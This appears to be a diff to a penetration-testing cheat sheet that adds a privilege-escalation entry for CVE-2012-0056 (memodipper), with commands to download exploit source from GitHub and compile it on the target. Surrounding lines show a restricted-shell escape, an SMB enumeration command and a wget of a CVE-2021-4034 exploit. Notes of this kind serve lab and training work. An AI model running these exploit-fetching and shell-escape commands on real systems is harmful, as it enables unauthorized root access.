@@ -447,6 +447,9 @@ export PATH=$PATH:/usr/bin
 BASH_CMDS[a]=/bin/sh;a
 ````
 ````
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+````
+````
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 ````
 ````
@@ -602,6 +605,11 @@ smbclient -L 10.11.0.22 --port=4455 --user=Administrator
 #### CVE-2021-4034
 ````
 wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
+````
+#### [CVE-2012-0056] memodipper
+````
+wget https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/memodipper/memodipper.c
+gcc memodipper.c -o memodipper #compile on the target not kali
 ````
 
 ## Windows PrivEsc <img src="https://vangogh.teespring.com/v3/image/9YwsrdxKpMa_uTATdBk8_wFGxmE/1200/1200.jpg" width="40" height="40" />
